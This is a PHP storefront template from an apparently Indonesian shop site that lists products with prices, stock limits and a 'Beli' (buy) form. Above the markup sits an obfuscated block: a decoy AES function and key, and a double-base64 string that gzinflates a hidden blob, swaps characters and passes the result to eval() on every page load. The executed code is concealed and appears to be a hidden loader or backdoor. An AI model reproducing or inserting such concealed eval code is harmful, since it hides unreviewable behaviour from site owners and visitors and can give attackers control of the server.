<?php
function evoplus($pesan, $encryption_key){$key = hex2bin($encryption_key); $pesan = base64_decode($pesan); $nonceSize = openssl_cipher_iv_length('aes-256-ctr'); $nonce = mb_substr($pesan, 0, $nonceSize, '8bit'); $cipherText = mb_substr($pesan, $nonceSize, null, '8bit'); $plaintext = openssl_decrypt($cipherText, 'aes-256-ctr', $key, OPENSSL_RAW_DATA, $nonce ); return $plaintext; } $private_secret_key = '1f4276388ad3214c873428dbef42243f';
$SISTEMIT_COM_ENC = "rVA9S8RAEO0D+RMhsBsRuf64Qi8rFuppEhERCSgkYNaQTHeIP2t+0BLYIkuKFFtN46p3MSBW2r6Pee8NArWdAeJsIDseNUPDoiVOYKXqPUYACnKgRkFv6pIvoqXvhZXtqVRgcIVhnojrG5Fm92yPsgenMQU3WlPPJ3EUvfoeoiNm/hWyjEBaMJp98YjhowVbl+74y1a30uRtR7B1LlUfYpCKc7HO8ABPk80F7qS3ZyIR+ERVIa0enHOBmyQWCZ7cYU/w3FmJsUjXwUd9xDeSmv6aNnsCmxYxPL6Mfylixp1/3sT3vsv88/CfeS5tsDKmxtY8iG3RW8ArUGNX4bTgU/gO";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP="EO0D+RMhsBsRuf64Qi8rFuppEhERCSgkYNaQTHeIP2t+0BLYIkuKFFtN46p3MSBW2r6Pee8NArWdAeJsIDseNUPDoiVOYKXqPUYACnKgRkFv6pIvoqXvhZXtqVRgcIVhnojrG5Fm92yPsgenMQU3WlPPJ3EUvfoeoiNm/hWyjEBaMJp98YjhowVbl+74y1a30uRtR7B1";
?>
 <section id="mu-course-content">
 <div class="container">
   <div class="row">
     <div class="col-md-12">
       <div class="mu-course-content-area">
          <div class="row">
            <div class="col-md-9">
              <div class="mu-course-container">
                <div class="row">
<?php 
  while($j = mysqli_fetch_array($barang)){ ?>
  <div class="col-md-6 col-sm-6">
    <div class="mu-latest-course-single">
      <figure class="mu-latest-course-img">
        <a href="<?= $j['gambar'] ?>"><img src="<?= $j['gambar'] ?>" style="object-fit: cover; width: 407px; height: 271px;"></a>
        <figcaption class="mu-latest-course-imgcaption">
          <a href="post?idbarang=<?= $j['idbarang'] ?>"><?= $j['namabarang'] ?></a>
          <span><i class="fa fa-toggle-on"></i><?= $j['kategori'] ?></span>
        </figcaption>
      </figure>
<form action="beli.php" method="POST">
<div class="mu-latest-course-single-content">
  <h4>Rp. <?= $memori['level']=='reseller' ? number_format($j['harga_r'],0,',','.') : number_format($j['harga'],0,',','.'); ?></h4>
  <p><?= substr(strip_tags($j['deskripsi']),0,50).'...'; ?></p>
  <button class="btn btn-danger">Terjual : <?= $j['terjual'] ?></button>
  <div class="mu-latest-course-single-contbottom">
    <input type="hidden" name="idbarang" value="<?= $j['idbarang'] ?>">
    <div class="input-group">
      <input type="number" name="jumlah" placeholder="Ex : 1" max="<?= $j['stok'] ?>" class="form-control" required>
      <span class="input-group-addon">
        <button type="submit"><i class="fa fa-shopping-cart"></i> Beli</button>
      </span>
    </div>
  </div>
</div>
</form>
    </div> 
  </div>
<?php } ?>
    </div>
  </div>
</div>
<div class="col-md-3">
<?php require('sidebar.php') ?>
<?php require('foot.php') ?>